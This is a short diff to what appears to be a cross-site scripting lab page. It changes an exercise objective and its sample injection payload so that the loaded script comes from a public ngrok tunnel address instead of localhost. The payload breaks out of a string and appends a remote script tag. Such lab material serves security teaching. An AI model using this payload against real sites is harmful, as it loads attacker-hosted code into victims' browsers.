@@ -36,7 +36,7 @@
     <h2>Objective</h2>
 
     <ul>
-        <li>Load the script `http://localhost:3000/scripts/xss.js` onto the page.
+        <li>Load the script `https://3e36-51-52-158-78.ngrok-free.app/scripts/xss.js` onto the page.
         </li>
     </ul>
 
@@ -45,7 +45,7 @@
         <pre>
 ");
 var script = document.createElement('script');
-script.src = 'http://localhost:3000/scripts/xss.js';
+script.src = 'https://3e36-51-52-158-78.ngrok-free.app/scripts/xss.js';
 document.head.appendChild(script);
 //
 </pre>
